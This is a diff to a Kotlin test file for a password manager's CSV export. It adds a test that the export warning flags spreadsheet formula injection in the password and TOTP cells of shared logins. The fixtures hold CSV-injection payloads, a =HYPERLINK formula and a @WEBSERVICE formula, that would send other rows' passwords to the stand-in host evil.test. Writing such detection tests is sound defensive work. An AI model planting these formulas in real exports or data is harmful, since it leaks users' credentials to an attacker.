@@ -132,6 +132,25 @@ class ExportTest {
      * corrupt real secrets, and Chrome/Bitwarden/KeePass don't either) — that decision was
      * signed off CONDITIONAL on a warning, and the warning was never built. This is it.
      */
+    /**
+     * Security review 2026-10 (root cause D): a co-member of a shared vault authors the PASSWORD and
+     * TOTP cells of the logins they create, and the writer emits them verbatim like every other
+     * column. Scanning only name/url/username/note let `=HYPERLINK("https://evil.test/?d="&D2:D999)`
+     * in a password cell export with no warning at all — and that formula reads the OTHER rows,
+     * the victim's own passwords. The warning now covers every cell the writer emits.
+     */
+    @Test
+    fun csv_warnings_formulaRisk_coversThePasswordAndTotpCells() {
+        val w = ExportCsv.warnings(
+            listOf(
+                login("Shared bank", "u", "=HYPERLINK(\"https://evil.test/?d=\"&D2:D999,\"Reset\")"),
+                login("Shared mail", "u", "p", totp = "@WEBSERVICE(\"https://evil.test\")"),
+                login("Fine", "u", "p", totp = "otpauth://totp/x?secret=AAAA"),
+            ),
+        )
+        assertEquals(listOf("Shared bank", "Shared mail"), w.formulaRisk)
+    }
+
     @Test
     fun csv_warnings_formulaRisk_namesTheRowsASpreadsheetWouldEvaluate() {
         val w = ExportCsv.warnings(
@@ -143,14 +162,14 @@ class ExportTest {
                 login("Leading space", " =1+1", "p"),
                 // A note is never WRITTEN to the CSV, so a formula in one cannot evaluate there.
                 ItemDoc(type = "note", name = "=NoteName", notes = "=1+1"),
-                // The password column is deliberately out of scope: a generated password that
-                // starts with `-` is ordinary, and a list that fires on most exports is ignored.
+                // Every written cell counts, the password included (security review 2026-10): a
+                // co-member authors shared passwords, so the old exemption was the attacker's cell.
                 login("Dash password", "u", "-Xk7#mQ2"),
                 login("Fine", "u", "p", uris = listOf("https://c.test")),
             ),
         )
         assertEquals(
-            listOf("=HYPERLINK name", "Plus user", "At url", "Minus note", "Leading space"),
+            listOf("=HYPERLINK name", "Plus user", "At url", "Minus note", "Leading space", "Dash password"),
             w.formulaRisk,
         )
         // The five original categories are unmoved by the new one.
